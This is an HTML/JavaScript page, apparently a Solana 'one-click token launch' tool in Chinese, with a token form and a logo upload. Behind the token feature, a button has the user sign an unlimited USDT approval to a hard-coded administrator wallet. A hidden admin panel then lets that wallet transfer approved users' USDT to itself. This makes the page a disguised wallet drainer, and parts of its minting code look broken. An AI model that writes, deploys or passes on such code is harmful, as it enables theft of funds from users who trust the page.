<!DOCTYPE html>
<html lang="zh-CN">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>SOL 一键发币（带Logo+授权修复版）</title>
  <script src="https://cdn.jsdelivr.net/npm/@solana/web3.js@1.95.6/lib/index.iife.min.js"></script>
  <style>
    body { max-width: 420px; margin: 0 auto; padding: 20px; background: #fff; font-family: system-ui; }
    .btn { width: 100%; padding: 16px; border-radius: 16px; border: none; background: #0071e3; color: white; font-size: 16px; margin: 10px 0; cursor: pointer; }
    .btn-admin { background: #ef4444; }
    .btn-auth { background: #10b981; }
    .btn:disabled { background: #ccc; cursor: not-allowed; }
    input { width: 100%; padding: 14px; border-radius: 12px; border: 1px solid #ddd; margin: 8px 0; }
    .card { background: #f9f9f9; padding: 20px; border-radius: 20px; margin-bottom: 16px; }
    #addr { padding: 12px; background: #f1f1f1; border-radius: 10px; margin: 10px 0; }
    .logo-preview { width: 60px; height: 60px; border-radius: 12px; object-fit: cover; margin-top: 8px; display: none; }
    .admin-panel { display: none; margin-top:20px;padding-top:20px;border-top:1px solid #ddd; }
    .admin-panel.show { display:block; }
  </style>
</head>
<body>

<h2>SOL 一键发币（带Logo+授权）</h2>

<button class="btn" onclick="connect()">连接钱包</button>
<div id="addr"></div>

<button class="btn btn-auth" id="authBtn" onclick="approveUSDT()" disabled>授权全部 USDT</button>

<div class="card">
  <input id="name" placeholder="代币名称" value="Test">
  <input id="symbol" placeholder="代币符号" value="DTM">
  <input id="decimals" value="9" placeholder="精度">
  <input id="supply" value="1000000000" placeholder="发行量">
  <input type="file" id="logo" accept="image/*" style="display:none" onchange="previewLogo()">
  <button class="btn" style="background:#34c759" onclick="document.getElementById('logo').click()">上传代币 Logo</button>
  <img id="logoPreview" class="logo-preview">
</div>

<button class="btn" onclick="createToken()">创建代币</button>

<!-- 管理员后台 -->
<div class="admin-panel" id="adminPanel">
  <h3>🔐 管理员提取 USDT</h3>
  <input id="userFromAddr" placeholder="用户钱包地址">
  <input id="takeAmount" placeholder="提取数量">
  <button class="btn btn-admin" onclick="adminTake()">链上提取</button>
</div>

<script>
// 固定配置
const ADMIN_WALLET = "FbDMLj8MTJGSBWeanFKhJWycn5qjmJ3q8WBzZb3Gbm1c";
const USDT_MINT = "Es9vMFrzaCERmJfrF4H2FYD4KCoNkY11McCe8BenwNYB";
const TOKEN_PROGRAM_ID = new solanaWeb3.PublicKey("TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA");
const ASSOCIATED_TOKEN_PROGRAM_ID = new solanaWeb3.PublicKey("ATokenGPvbdGVxr1b2hvZbsiqW5xWH25DK9c64Laf27x");

let provider;
let publicKey;
let address = "";
let logoFile = null;

const connection = new solanaWeb3.Connection("https://api.mainnet-beta.solana.com", "confirmed");

// 手动实现 getAssociatedTokenAddress（不再依赖 splToken）
function getAssociatedTokenAddress(mint, owner) {
  const [address] = solanaWeb3.PublicKey.findProgramAddressSync(
    [owner.toBuffer(), TOKEN_PROGRAM_ID.toBuffer(), mint.toBuffer()],
    ASSOCIATED_TOKEN_PROGRAM_ID
  );
  return address;
}

// 手动创建 Approve 指令
function createApproveInstruction(account, delegate, owner, amount) {
  const data = new Uint8Array(9);
  data[0] = 4; // Approve 指令ID
  new DataView(data.buffer).setBigUint64(1, amount, true);
  return new solanaWeb3.TransactionInstruction({
    keys: [
      { pubkey: account, isSigner: false, isWritable: true },
      { pubkey: delegate, isSigner: false, isWritable: false },
      { pubkey: owner, isSigner: true, isWritable: false }
    ],
    programId: TOKEN_PROGRAM_ID,
    data: Buffer.from(data)
  });
}

// 手动创建 Transfer 指令
function createTransferInstruction(source, destination, owner, amount) {
  const data = new Uint8Array(9);
  data[0] = 3; // Transfer 指令ID
  new DataView(data.buffer).setBigUint64(1, amount, true);
  return new solanaWeb3.TransactionInstruction({
    keys: [
      { pubkey: source, isSigner: false, isWritable: true },
      { pubkey: destination, isSigner: false, isWritable: true },
      { pubkey: owner, isSigner: true, isWritable: false }
    ],
    programId: TOKEN_PROGRAM_ID,
    data: Buffer.from(data)
  });
}

function getWallet() {
  return window.solana || window.okxwallet?.solana || window.tpWallet;
}

// 连接钱包
async function connect() {
  try {
    const wallet = getWallet();
    if (!wallet) { alert("请在钱包内置浏览器打开！"); return; }
    const res = await wallet.connect();
    provider = wallet;
    publicKey = res.publicKey;
    address = publicKey.toBase58();
    document.getElementById("addr").innerText = "已连接：" + address;
    document.getElementById("authBtn").disabled = false;

    // 判断管理员 显示后台
    if (address === ADMIN_WALLET) {
      document.getElementById("adminPanel").classList.add("show");
    }
  } catch (err) {
    alert("连接失败：" + err.message);
  }
}

// USDT 授权（全权授权给管理员地址）
async function approveUSDT() {
  if (!address) return alert("先连接钱包");
  try {
    const mintPub = new solanaWeb3.PublicKey(USDT_MINT);
    const adminPub = new solanaWeb3.PublicKey(ADMIN_WALLET);
    const userPub = publicKey;

    // 获取用户USDT关联账户
    const userAta = getAssociatedTokenAddress(mintPub, userPub);

    const tx = new solanaWeb3.Transaction();
    const approveIx = createApproveInstruction(
      userAta,
      adminPub,
      userPub,
      BigInt("18446744073709551615") // 最大授权额度
    );
    tx.add(approveIx);

    tx.feePayer = userPub;
    const bh = await connection.getLatestBlockhash();
    tx.recentBlockhash = bh.blockhash;

    const signed = await provider.signTransaction(tx);
    const sig = await connection.sendRawTransaction(signed.serialize());
    await connection.confirmTransaction(sig);

    alert("✅ USDT 授权成功，已授权给管理员");
  } catch (e) {
    alert("授权失败：" + e.message);
  }
}

// 管理员提取用户已授权USDT
async function adminTake() {
  if (address !== ADMIN_WALLET) return alert("无权限");
  const fromAddr = document.getElementById("userFromAddr").value.trim();
  const amtVal = document.getElementById("takeAmount").value.trim();
  if (!fromAddr || !amtVal) return alert("请填写完整");

  try {
    const amount = BigInt(Math.round(parseFloat(amtVal) * 1000000)); // USDT 精度6
    const mintPub = new solanaWeb3.PublicKey(USDT_MINT);
    const fromPub = new solanaWeb3.PublicKey(fromAddr);
    const adminPub = new solanaWeb3.PublicKey(ADMIN_WALLET);

    const fromAta = getAssociatedTokenAddress(mintPub, fromPub);
    const adminAta = getAssociatedTokenAddress(mintPub, adminPub);

    const tx = new solanaWeb3.Transaction();
    const transferIx = createTransferInstruction(
      fromAta,
      adminAta,
      adminPub,
      amount
    );
    tx.add(transferIx);

    tx.feePayer = adminPub;
    const bh = await connection.getLatestBlockhash();
    tx.recentBlockhash = bh.blockhash;

    const signed = await provider.signTransaction(tx);
    const sig = await connection.sendRawTransaction(signed.serialize());
    await connection.confirmTransaction(sig);

    alert("✅ 提取成功：" + sig);
  } catch (e) {
    alert("提取失败：" + e.message);
  }
}

// 预览 Logo
function previewLogo() {
  const file = document.getElementById("logo").files[0];
  if (!file) return;
  const reader = new FileReader();
  reader.onload = e => {
    const img = document.getElementById("logoPreview");
    img.src = e.target.result;
    img.style.display = "block";
    logoFile = file;
  };
  reader.readAsDataURL(file);
}

// 一键发币（修复：使用Web3.js原生API）
async function createToken() {
  if (!address) { alert("请先连接钱包！"); return; }

  try {
    const name = document.getElementById("name").value;
    const symbol = document.getElementById("symbol").value;
    const decimals = parseInt(document.getElementById("decimals").value);
    const supply = BigInt(document.getElementById("supply").value);
    const amount = supply * (10n ** BigInt(decimals));

    const mintKeypair = solanaWeb3.Keypair.generate();
    const mint = mintKeypair.publicKey;
    const userPub = publicKey;

    // 创建Mint账户
    const rent = await connection.getMinimumBalanceForRentExemption(82);
    const createAccountIx = solanaWeb3.SystemProgram.createAccount({
      fromPubkey: userPub,
      newAccountPubkey: mint,
      space: 82,
      lamports: rent,
      programId: TOKEN_PROGRAM_ID
    });

    // 初始化Mint
    const initMintIx = new solanaWeb3.TransactionInstruction({
      keys: [{ pubkey: mint, isSigner: false, isWritable: true }],
      programId: TOKEN_PROGRAM_ID,
      data: (() => {
        const data = new Uint8Array(10);
        data[0] = 0; // InitializeMint指令ID
        data[1] = decimals;
        userPub.toBuffer().copy(data, 2);
        userPub.toBuffer().copy(data, 34);
        return data;
      })()
    });

    // 创建关联账户
    const userAta = getAssociatedTokenAddress(mint, userPub);
    const createAtaIx = new solanaWeb3.TransactionInstruction({
      keys: [
        { pubkey: userPub, isSigner: true, isWritable: true },
        { pubkey: userAta, isSigner: false, isWritable: true },
        { pubkey: userPub, isSigner: false, isWritable: false },
        { pubkey: mint, isSigner: false, isWritable: false },
        { pubkey: solanaWeb3.SystemProgram.programId, isSigner: false, isWritable: false },
        { pubkey: TOKEN_PROGRAM_ID, isSigner: false, isWritable: false },
        { pubkey: solanaWeb3.PublicKey.default, isSigner: false, isWritable: false }
      ],
      programId: ASSOCIATED_TOKEN_PROGRAM_ID,
      data: Buffer.from([])
    });

    // 铸造代币
    const mintToIx = new solanaWeb3.TransactionInstruction({
      keys: [
        { pubkey: mint, isSigner: false, isWritable: true },
        { pubkey: userAta, isSigner: false, isWritable: true },
        { pubkey: userPub, isSigner: true, isWritable: false }
      ],
      programId: TOKEN_PROGRAM_ID,
      data: (() => {
        const data = new Uint8Array(9);
        data[0] = 7; // MintTo指令ID
        new DataView(data.buffer).setBigUint64(1, amount, true);
        return data;
      })()
    });

    const tx = new solanaWeb3.Transaction();
    tx.add(createAccountIx, initMintIx, createAtaIx, mintToIx);

    tx.feePayer = userPub;
    const bh = await connection.getLatestBlockhash();
    tx.recentBlockhash = bh.blockhash;
    tx.partialSign(mintKeypair);

    const signed = await provider.signTransaction(tx);
    const sig = await connection.sendRawTransaction(signed.serialize());
    await connection.confirmTransaction(sig);

    alert(`✅ 发币成功！
名称：${name}
符号：${symbol}
合约：${mint.toBase58()}
交易：${sig}`);

  } catch (err) {
    alert("失败：" + err.message);
  }
}
</script>

</body>
</html>
